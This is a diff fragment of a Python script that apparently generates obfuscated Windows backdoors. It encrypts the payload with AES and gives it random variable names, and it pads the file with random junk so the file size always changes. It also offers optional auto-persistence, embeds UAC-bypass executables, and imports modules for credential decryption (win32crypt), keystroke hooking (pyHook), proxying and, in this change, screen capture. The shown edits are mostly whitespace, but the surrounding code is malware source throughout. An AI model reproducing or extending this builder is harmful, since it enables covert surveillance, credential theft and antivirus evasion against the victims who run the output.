@@ -17,7 +17,6 @@
 from Crypto.Cipher import AES
 import base64, random, string, sys, os, argparse
 
-
 def randKey(bytes):
 	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))
 
@@ -69,7 +68,7 @@ triplequote = "'" * 3
 lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
 junk = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
 if args.persistence:
-	persistpart = '''	
+	persistpart = '''
 	else:
 		if isAdmin and platform.uname()[2] == '7':
 			fpersist()
@@ -77,7 +76,7 @@ if args.persistence:
 	print ' [*] Auto-persistence enabled.'
 else:
 	persistpart = ' '
-	
+
 with open('base64/86', 'rb') as exe86:
 	bypass86 = "bypass86exe = '%s'" % (exe86.read())
 
@@ -95,7 +94,7 @@ import ''')
 
 myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests']
 myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var)]
-mywindows = ['win32api', 'win32crypt', 'pyHook', 'pythoncom', 'win32con']
+mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
 
 if args.proxy:
 	mywindows.append('socks')
